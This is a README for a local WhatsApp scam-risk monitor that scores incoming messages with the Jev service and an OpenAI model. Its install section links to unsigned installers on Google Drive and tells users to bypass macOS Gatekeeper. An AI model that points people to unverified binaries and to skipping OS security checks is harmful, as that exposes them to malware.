# WhatsApp Jev Guard

Local WhatsApp scam-risk monitor. Baileys connects the account, Jev provides the primary score, and GPT-5.6-luna provides an independent comparison score, conversation-level turning point, and English translation.

## Install and run
You have two options: use the pre-built files directly from the `dist` folder, or run the project from source with npm.

### Option 1: Use Pre-built `dist` Files (Recommended for End Users)
No build step or dev dependencies required — ready to use out of the box.
Mac https://drive.google.com/file/d/19j62YrCVosNF6jxWb9YI_RA1-_FJnMQJ/view?usp=drive_link 
Mac-arm64 https://drive.google.com/file/d/1c3I8FBxmh66gkDbDOebniWu44nx6ykxt/view?usp=drive_link 
windows https://drive.google.com/file/d/1HAVNM7_N11FRpXsxiVfyQnK69grUICbB/view?usp=drive_link
1. Download needed version that match your operating system
2. Click the file and install it.

The pre-built files in the `dist` folder are not code-signed with an Apple Developer ID. On first launch, macOS Gatekeeper may block execution and show a "cannot be opened because the developer cannot be verified" warning.

1. After the security prompt appears, open **System Settings** → **Privacy & Security**.
2. Scroll down to the **Security** section.
3. Click **Allow Anyway** next to the blocked file notice.

### Option 2: Run from Source (Developer Setup)

```bash
cd whatsapp_jev_guard
npm install
cp .env.example .env
npm start
```

Open <http://localhost:8787>, click **Connect WhatsApp**, and scan the QR code from WhatsApp **Linked devices**.

If port 8787 is already in use, an existing instance may already be running. To start a second instance, use `PORT=8788 npm start`.

If `TYPESAFE_API_KEY` is empty, the app uses local heuristics so the connection and UI can still be tested.

## Build desktop executables

Install dependencies, then run:

```bash
npm run package:electron:mac
# On Windows, run: npm run package:electron:win
```

The `dist-electron/` directory contains:

- macOS `.dmg` and `.zip` installers
- Windows NSIS installer (`WhatsApp Jev Guard-0.1.0-win-x64-installer.exe`)
- Windows portable executable (`WhatsApp Jev Guard-0.1.0-win-x64-portable.exe`)

The packaged program opens the local dashboard automatically. Settings and Baileys data are stored in Electron's per-user application data directory; API keys are not compiled into the executable. On macOS, the first launch may require allowing the unsigned app in **System Settings → Privacy & Security**.

## Configuration

Set these values in `.env`, or enter them in **Settings**:

```env
TYPESAFE_API_KEY=
TYPESAFE_MODEL=jev-latest
JEV_API_URL=https://api.typesafe.ai/v1/systemone
OPENAI_API_KEY=
OPENAI_MODEL=gpt-5.6-luna
OPENAI_API_URL=https://api.openai.com/v1/responses
OPENAI_TIMEOUT_MS=120000
WHATSAPP_PROXY_URL=
```

The TypeSafe URL is the correct System One endpoint. It accepts `POST`; a `GET` request returns `405 Method Not Allowed`. Requests without a key return an authentication error, confirming that the endpoint is reachable and protected.

## Message analysis

- Jev analyzes message content and account signals: saved-contact status, WhatsApp verified business name, business profile, country code, and first-seen status.
- The dashboard's **Current account** card uses the WhatsApp profile nickname/push name when Baileys provides it, with a generic fallback instead of exposing the phone number or JID.
- GPT-5.6-luna independently scores the same message and recent conversation turns.
- The GPT comparison reports the first conversation turn where material scam evidence appears.
- Each message has **Translate to English**. The translation uses the configured OpenAI model and is cached for the current process.
- **Review strangers only** is enabled by default. Saved-contact messages stay local and are marked `Skipped`; turn the setting off to send all incoming messages through Jev and GPT.
- **Review outgoing messages** is off by default. Turn it on in **Settings** when messages sent by your own account should also be scored.
- **Treat every message as from a stranger** is an off-by-default testing mode. New messages bypass saved-contact treatment, use unknown-sender account signals, and display `Stranger` without changing WhatsApp contacts.
- Password fields in **Settings** are intentionally blank when reopened. Leave them blank to keep the existing key; keys and review switches are persisted in `.data/settings.json` with local-only permissions.
- If Jev is unavailable, the app falls back to local heuristics. If OpenAI is not configured, GPT comparison and translation show an explicit unavailable/error state.
- If GPT comparison fails, the message detail card provides **Retry GPT evaluation**. Retrying calls only GPT and does not repeat the Jev request.
- GPT requests use a 120-second timeout by default; override it with `OPENAI_TIMEOUT_MS` when using a slower local gateway.
- A WhatsApp initialization timeout (`408`) is retried with backoff up to `MAX_RECONNECT_ATTEMPTS` (default: 3). If it still fails, the UI stops retrying and offers a clear-session-and-scan-again action so it cannot remain stuck in Connecting forever.
- Baileys needs network access to WhatsApp Web endpoints. If `web.whatsapp.com` or the WhatsApp WebSocket is blocked by a firewall, VPN, proxy, or regional network policy, no QR event can be received; fix network access first, then use **Clear session and scan again**.
- The monitor keeps the linked device online and also accepts recent offline-delivery (`append`) events, so messages received while the connection briefly reconnects are not silently discarded.
- If a proxy is required, set `WHATSAPP_PROXY_URL`, for example `http://127.0.0.1:7897` or `http://user:password@host:port`, or enter it in **Settings → WhatsApp proxy URL**. The packaged Electron app does not inherit proxy variables from the Terminal; after saving a proxy, disconnect and connect WhatsApp again.

Runtime logs are stored in `.data/logs/app.log`; logs omit full message bodies.

## Privacy and limitations

- The app only analyzes newly received messages and does not automatically reply, forward, delete, report, or block.
- Baileys authentication files are stored in `.data/baileys-auth/`; never commit them.
- Baileys is an unofficial WhatsApp Web client and may be affected by protocol changes or account restrictions. Use only accounts you are authorized to connect.
- API keys are stored locally in the gitignored `.data/settings.json` (mode `0600`) and loaded into the process at startup; use the operating-system keychain for production.
